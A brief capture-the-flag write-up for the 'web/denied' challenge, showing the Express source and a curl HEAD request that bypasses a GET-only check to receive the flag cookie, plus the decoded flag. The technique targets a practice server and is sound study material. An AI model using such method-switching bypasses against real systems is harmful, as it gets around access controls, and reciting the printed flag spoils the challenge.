## web/denied
- problem
![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/4ce1ae31-5215-4b63-a718-291dfc484dc5)
- on reaching the endpoint
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/12e69d4e-1bdd-425f-9f81-c5c5c2a66ed1)
- the given code
```
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

```
- so we must not use get method
- copied the curl request and made a post
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/3758a32d-8118-4002-baf0-3b2d75bebeda)
- the post method is not available
- so we see what options do we have
- we see get,head
- now from this https://reqbin.com/req/c-tmyvmbgu/curl-head-request-example
- we do send a head request
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/b8d0bda9-d3c4-4e25-a028-30c5a6b8e025)
```
C:\home\radha> curl http://denied.amt.rs/ -I     
HTTP/1.1 200 OK
Content-Length: 7
Content-Type: text/html; charset=utf-8
Date: Sat, 06 Apr 2024 05:37:48 GMT
Etag: W/"7-skdQAtrqJAsgWjDuibJaiRXqV44"
Server: Caddy
Set-Cookie: flag=amateursCTF%7Bs0_m%40ny_0ptions...%7D; Path=/
X-Powered-By: Express
```
- we got a cookie
- use url decoder
- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/c1be76e1-43d2-4bc7-843b-90b6261f8924)
- we get the flag`amateursCTF{s0_m@ny_0ptions...}`
